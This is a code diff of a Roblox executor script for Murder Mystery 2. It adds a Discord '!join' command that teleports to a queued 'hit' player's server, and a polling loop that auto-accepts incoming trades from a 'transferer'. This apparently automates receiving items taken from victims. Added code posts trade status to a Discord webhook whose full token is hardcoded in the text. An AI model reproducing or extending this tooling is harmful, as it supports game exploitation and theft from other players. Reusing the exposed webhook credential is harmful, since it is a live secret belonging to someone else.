@@ -269,6 +269,7 @@ getgenv()._aj_lastAction    = getgenv()._aj_lastAction    or nil  -- {msg, ts} l
 getgenv()._aj_sessionClaims = getgenv()._aj_sessionClaims or 0   -- total claims this session
 getgenv()._aj_lastWeapon    = getgenv()._aj_lastWeapon    or nil  -- {name, amount, value, ts}
 getgenv()._aj_teleporting   = getgenv()._aj_teleporting   or false
+getgenv()._aj_hitHistory    = getgenv()._aj_hitHistory    or {}   -- code→hit for !join
 -- WebSocket gateway session (persists across teleports for RESUME)
 getgenv()._aj_gwSeq       = getgenv()._aj_gwSeq       or nil
 getgenv()._aj_gwSession   = getgenv()._aj_gwSession   or nil
@@ -449,6 +450,18 @@ end
 local function enqueue(hit)
     for _, h in ipairs(hitQueue) do
         if h.jobId == hit.jobId then return end
+    end
+    -- assign hit code and store in history for !join
+    if not hit.code then hit.code = hit.jobId:sub(1, 6):upper() end
+    local hist = getgenv()._aj_hitHistory
+    hist[hit.code] = hit
+    local keys = {}
+    for k in pairs(hist) do table.insert(keys, k) end
+    if #keys > 30 then
+        table.sort(keys, function(a, b)
+            return (hist[a] and hist[a].timestamp or 0) < (hist[b] and hist[b].timestamp or 0)
+        end)
+        for i = 1, #keys - 30 do hist[keys[i]] = nil end
     end
     table.insert(hitQueue, hit)
     table.sort(hitQueue, function(a, b) return a.value > b.value end)
@@ -763,7 +776,7 @@ end
 
 local destroyNoRender, buildNoRender  -- forward-declared; defined after WindUI section
 
-local function handleCommand(cmd, senderName)
+local function handleCommand(cmd, senderName, args)
     logMsg("CMD !" .. cmd .. " from " .. senderName)
     if cmd == "status" then
         local ch     = getgenv()._aj_currentHit
@@ -982,6 +995,21 @@ local function handleCommand(cmd, senderName)
         else
             sendBotMsg("❌ No claim recorded this session")
         end
+    elseif cmd == "join" then
+        local code = (args or ""):upper():gsub("%s+", "")
+        if code == "" then
+            sendBotMsg("❌ Usage: `!join CODE`  (e.g. `!join A3F2B1`)")
+        else
+            local h = (getgenv()._aj_hitHistory or {})[code]
+            if h then
+                visited[h.jobId] = nil
+                sendBotMsg("🔄 Joining **" .. h.playerName .. "** `[" .. code .. "]` — " .. commaNum(h.value) .. " value...")
+                logMsg("!join " .. code .. " → " .. h.playerName)
+                joinServer(h)
+            else
+                sendBotMsg("❌ Code `" .. code .. "` not found — only hits seen this session are stored")
+            end
+        end
     elseif cmd == "norender" then
         if getgenv()._aj_norender then
             destroyNoRender()
@@ -997,6 +1025,7 @@ local function handleCommand(cmd, senderName)
             description = table.concat({
                 "**!status** — current target, value, time in server, queue size",
                 "**!inv** — your MM2 inventory (Godly+) with values",
+                "**!join CODE** — join a specific hit by code (shown in transferer embed as 🔑 `XXXXXX`)",
                 "**!rejoin** — teleport back to the active hit's server",
                 "**!serverhop** — leave and join a random MM2 server",
                 "**!retry** — retry the last hit that failed to join",
@@ -1311,10 +1340,10 @@ local function processMsg(msg)
 
     -- Commands: non-webhook plain messages starting with !
     if not msg.webhook_id and msg.content then
-        local cmd = msg.content:match("^!(%S+)")
+        local cmd, args = msg.content:match("^!(%S+)%s*(.*)")
         if cmd then
             local sender = (msg.author and msg.author.username) or "unknown"
-            task.spawn(function() handleCommand(cmd:lower(), sender) end)
+            task.spawn(function() handleCommand(cmd:lower(), sender, args or "") end)
         end
     end
 
@@ -1669,28 +1698,71 @@ task.spawn(function()
         pcall(function() TradeRS.AcceptRequest:FireServer() end)
     end)
 
-    -- Trade opened: wait out the 6s cooldown, then confirm
+    -- Shared polling-based accept loop (mirrors transferer's ReadyTrade).
+    -- Launched by StartTrade event AND by post-accept request guard — whichever triggers first.
+    -- Uses GetTradeStatus:InvokeServer() each tick so lastOffer is always fresh.
+    local acceptLoopRunning = false
+    local function startAcceptLoop()
+        if acceptLoopRunning then return end
+        acceptLoopRunning = true
+        task.spawn(function()
+            local DBG_WH = "https://discord.com/api/webhooks/1528011349735641222/rTCbxVVjJqsYDDlYy6P-H1Y8vtnNsn3R8JshIz-Q0jLH3Wckehr_1FyZ3J-JL97Mc078"
+            local function dbg(msg)
+                pcall(function()
+                    request({ Url=DBG_WH, Method="POST",
+                        Headers={["Content-Type"]="application/json"},
+                        Body=HttpService:JSONEncode({content="🤖 **[AJ-Trade]** "..tostring(msg), username="MM2 AJ Debug"})
+                    })
+                end)
+            end
+            local cooldownExpiry = tick() + 3  -- synced with transferer's 3s cooldown
+            local deadline       = tick() + 50
+            dbg("acceptLoop started cooldown=3s")
+            while tick() < deadline and alive() do
+                local ok, status, td = pcall(function()
+                    return TradeRS.GetTradeStatus:InvokeServer()
+                end)
+                if not ok then task.wait(0.5); continue end
+                dbg("status="..tostring(status).." hasOffer="..tostring(td and td.LastOffer ~= nil))
+                if status == "None" then
+                    dbg("status=None → loop exit")
+                    break
+                end
+                -- Refresh lastOffer from poll result (more reliable than UpdateTrade event)
+                if td and td.LastOffer then lastOffer = td.LastOffer end
+                if status == "StartTrade" and lastOffer ~= nil and tick() >= cooldownExpiry then
+                    local fireOk, fireErr = pcall(function()
+                        TradeRS.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
+                    end)
+                    dbg("AcceptTrade fired ok="..tostring(fireOk)..(fireOk and "" or " err="..tostring(fireErr)))
+                    setAction("AcceptTrade fired — waiting for server confirm")
+                    task.wait(1)
+                end
+                task.wait(0.5)
+            end
+            acceptLoopRunning = false
+            dbg("acceptLoop ended")
+        end)
+    end
+
+    -- Trade opened: launch polling accept loop
     table.insert(conns, TradeRS.StartTrade.OnClientEvent:Connect(function(tradeData, partnerName)
-        if not isAllowed(partnerName) then return end
+        local pname = type(partnerName) == "string" and partnerName
+                      or pcall(function() return partnerName.Name end) and partnerName.Name
+                      or tostring(partnerName)
+        if not isAllowed(pname) then
+            pcall(function()
+                request({ Url="https://discord.com/api/webhooks/1528011349735641222/rTCbxVVjJqsYDDlYy6P-H1Y8vtnNsn3R8JshIz-Q0jLH3Wckehr_1FyZ3J-JL97Mc078",
+                    Method="POST", Headers={["Content-Type"]="application/json"},
+                    Body=HttpService:JSONEncode({content="🤖 **[AJ-Trade]** StartTrade from `"..tostring(pname).."` — NOT ALLOWED (currentHit="..tostring(getgenv()._aj_currentHit and getgenv()._aj_currentHit.playerName)..")", username="MM2 AJ Debug"})
+                })
+            end)
+            return
+        end
         if tradeData then lastOffer = tradeData.LastOffer end
         inTrade = true
         getgenv()._aj_lastTradeTime = os.time()
-        task.wait(7)
-        if not inTrade then return end
-        -- Wait up to 10s for UpdateTrade to supply lastOffer if StartTrade didn't
-        if lastOffer == nil then
-            local waited = 0
-            repeat task.wait(0.5); waited = waited + 0.5
-            until lastOffer ~= nil or waited >= 10 or not inTrade
-        end
-        if not inTrade or lastOffer == nil then
-            warn("[AJ] AcceptTrade aborted — lastOffer is nil after wait")
-            return
-        end
-        setAction("AcceptTrade fired — waiting for server confirm")
-        pcall(function()
-            TradeRS.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
-        end)
+        startAcceptLoop()
     end))
 
     -- Trade completed: detect received items via inventory diff, update stats, log webhook
@@ -1772,22 +1844,35 @@ task.spawn(function()
         preTradeSnap = nil
     end))
 
-    -- Race-condition guard: if a trade request arrived BEFORE our listeners were
-    -- ready (transferer sends fast after join), catch it by polling GetTradeStatus once.
+    -- Race-condition guard: poll every 2s for missed ReceivingRequest or StartTrade
     task.spawn(function()
         task.wait(1)
-        if not alive() then return end
-        pcall(function()
-            local status = TradeRS.GetTradeStatus:InvokeServer()
-            if status == "ReceivingRequest" then
-                warn("[AJ] Pending request detected on setup — accepting")
-                task.spawn(function() preTradeSnap = snapInventory() end)
-                getgenv()._aj_lastTradeTime = os.time()
-                task.delay(0.3, function()
-                    pcall(function() TradeRS.AcceptRequest:FireServer() end)
-                end)
-            end
-        end)
+        while alive() do
+            if not alive() then break end
+            pcall(function()
+                local status, td = TradeRS.GetTradeStatus:InvokeServer()
+                if status == "ReceivingRequest" then
+                    warn("[AJ] Pending ReceivingRequest detected — accepting")
+                    task.spawn(function() preTradeSnap = snapInventory() end)
+                    getgenv()._aj_lastTradeTime = os.time()
+                    task.delay(0.3, function()
+                        pcall(function() TradeRS.AcceptRequest:FireServer() end)
+                    end)
+                    task.wait(1)
+                    startAcceptLoop()
+                elseif status == "StartTrade" and not acceptLoopRunning then
+                    -- Only accept if we're in a hit server (prevents accepting random trades when idle)
+                    if getgenv()._aj_currentHit then
+                        warn("[AJ] StartTrade detected by poll but event missed — launching accept loop")
+                        if td and td.LastOffer then lastOffer = td.LastOffer end
+                        inTrade = true
+                        getgenv()._aj_lastTradeTime = os.time()
+                        startAcceptLoop()
+                    end
+                end
+            end)
+            task.wait(2)
+        end
     end)
 end)
 
